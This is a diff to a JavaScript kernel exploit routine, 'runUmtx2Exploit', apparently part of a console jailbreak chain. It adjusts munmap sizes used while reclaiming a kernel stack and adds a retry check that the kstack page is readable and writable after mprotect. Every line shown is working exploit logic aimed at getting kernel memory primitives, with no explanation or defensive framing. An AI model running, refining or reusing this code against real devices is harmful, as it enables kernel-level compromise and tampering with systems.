@@ -964,7 +964,7 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
         if (closeRes != 0 || (kstack.low << 0) == -1) {
             await log("Failed to reclaim kstack. Retrying...", LogLevel.WARN);
             if (doInvalidKstackMunmap) {
-                await chain.syscall(SYS_MUNMAP, kstack, 0x2500);
+                await chain.syscall(SYS_MUNMAP, kstack, 0x4000);
             }
             kstack = null;
             continue;
@@ -981,15 +981,26 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
         if (mprotectRes != 0) {
             await log("mprotect failed. Retrying...", LogLevel.WARN);
             if (doInvalidKstackMunmap) {
-                await chain.syscall(SYS_MUNMAP, kstack, 0x3000);
+                await chain.syscall(SYS_MUNMAP, kstack, 0x4000);
             }
             kstack = null;
             continue;
         }
 
+        await log("Managed to modify kstack memory protection to r/w", LogLevel.INFO);
 
-
-
+        // check if we have access to the page
+        const checkRes = await checkMemoryAccess(kstack);
+        if (!checkRes) {
+            checkMemoryAccessFailCount++;
+            await log("Failed to access kstack memory. Retrying...", LogLevel.WARN);
+            if (doInvalidKstackMunmap) {
+                await chain.syscall(SYS_MUNMAP, kstack, 0x4000);
+            }
+            kstack = null;
+            await new Promise((resolve) => setTimeout(resolve, 1000));
+            continue;
+        }
 
         await log("kstack can be accessed", LogLevel.SUCCESS);
 
@@ -997,7 +1008,7 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
         if (kprimId == null) {
             await log("Failed to get kprim id from kstack. Retrying..", LogLevel.WARN);
             if (doInvalidKstackMunmap) {
-                await chain.syscall(SYS_MUNMAP, kstack, 0x2500);
+                await chain.syscall(SYS_MUNMAP, kstack, 0x4000);
             }
             kstack = null;
             continue;
